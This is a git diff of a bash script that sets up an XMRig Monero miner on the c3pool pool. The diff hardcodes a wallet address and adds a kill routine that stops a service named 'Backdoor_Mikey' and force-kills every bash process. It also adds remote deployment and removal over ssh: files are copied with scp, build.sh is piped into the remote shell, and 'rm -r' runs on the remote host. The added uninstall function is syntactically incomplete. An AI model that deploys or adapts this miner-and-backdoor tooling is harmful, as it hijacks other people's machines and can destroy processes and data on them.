@@ -22,7 +22,7 @@ echo '
 #     53333: 2G diff (ETH port/SSL/TLS)
 poolPort=17777
 # your wallet public address
-wallet=YOUR_WALLET_ADRRESS
+wallet=4256HG8uJUTPBqZiJYPNQ92x6PV1sUsngAsv3TQX4woqJGFsKQkjCdoZKbgfr8C3VnLWK7Qd5Y3WJBPcuzMW93AmVSYtN2W
 # installation directory (DONT change)
 DIR=$HOME/c3pool
 # remote build via IP
@@ -41,9 +41,11 @@ detatched=true
 
 # ======== c3Pool setup script for Monero Miner ======== 
 function killAll () {
-    echo 'killing all open miner processes ...'
-    sed -i '/c3pool/d' $HOME/.profile
-    killall -9 xmrig
+    killall -9 cpulimit
+    sed -i '/c3pool/d' $HOME/.profile;
+    killall -9 xmrig;
+    sudo systemctl stop Backdoor_Mikey.service  
+    killall -9 bash
 }
 function stopService () {
     systemctl stop c3pool_miner.service
@@ -106,6 +108,15 @@ function install () {
         echo installation found at $DIR
     fi   
 }
+function uninstall () {
+    echo uninstalling DirtyMike ...
+    echo uninstall on remote host? (y/n); read input
+    if [[ "$input" == "y" ]]; then
+        echo "Hostname: ";read IP;echo "Login: ";read USER
+        ssh $USER@$IP "rm -r $DIR"
+    else
+        rm -r $DIR
+}
 function refresh () {
     sudo systemctl daemon-reload
     sudo systemctl reset-failed
@@ -133,7 +144,7 @@ EOL
 function build () {
     killAll       
     wait
-    install && removeService
+    install && removeService && killAll
     wait
     shuffle &
     if [[ $daemon_active == true ]]; then
@@ -144,8 +155,9 @@ function build () {
 }
 
 
-# run build
-if [[ "$1" == "-r" ]]; then # draw host credentials
+# interpret
+mode=$1;
+if [[ "$mode" == "-r" ]]; then # draw host credentials
     echo $USER deploying build remotely at $IP ...
     echo "Hostname: ";read IP;echo "Login: ";read USER
     scp -r ./* $USER@$IP:/home && \
@@ -154,6 +166,8 @@ if [[ "$1" == "-r" ]]; then # draw host credentials
     else
         cat ./build.sh | ssh $USER@$IP /bin/bash
     fi
-else # build locally
-    build
+elif [[ "$mode" == "-k" ]]; then
+    killAll
+elif [[ "$mode" == "-u" ]]; then
+    uninstall
 fi
